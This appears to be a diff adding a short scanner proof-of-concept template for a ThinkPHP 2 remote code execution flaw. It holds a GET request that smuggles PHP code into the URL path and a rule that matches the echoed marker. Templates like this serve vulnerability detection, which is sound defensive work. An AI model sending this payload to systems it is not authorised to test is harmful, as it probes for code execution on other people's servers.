@@ -1,0 +1,7 @@
+name: poc-yaml-thinkphp2-method-rce
+groups:
+  poc1:
+    - method: GET
+      path: /index.php?s=/index/index/name/$%7B@print_r(test2025)%7D
+      expression: |
+        response.body.bcontains(b"test2025")
